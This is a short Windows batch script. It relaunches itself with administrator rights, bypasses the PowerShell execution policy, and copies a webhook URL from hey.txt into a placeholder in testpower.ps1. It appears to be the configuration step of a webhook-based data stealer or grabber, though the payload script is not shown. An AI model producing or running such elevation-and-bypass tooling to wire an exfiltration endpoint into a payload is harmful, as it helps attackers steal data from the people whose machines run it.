@echo off

net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
cd /d %~dp0


set "file=hey.txt"
set "variable="

for /f "usebackq delims=" %%A in ("%file%") do (set "variable=%%A")
REM echo $webhook = "YOUR_WEBHOOK_HERE" >> powershell123.ps1
set "ps=testpower.ps1"
powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "(Get-Content %ps%) -replace 'YOUR_WEBHOOK_HERE', '%variable%' | Set-Content %ps%"
exit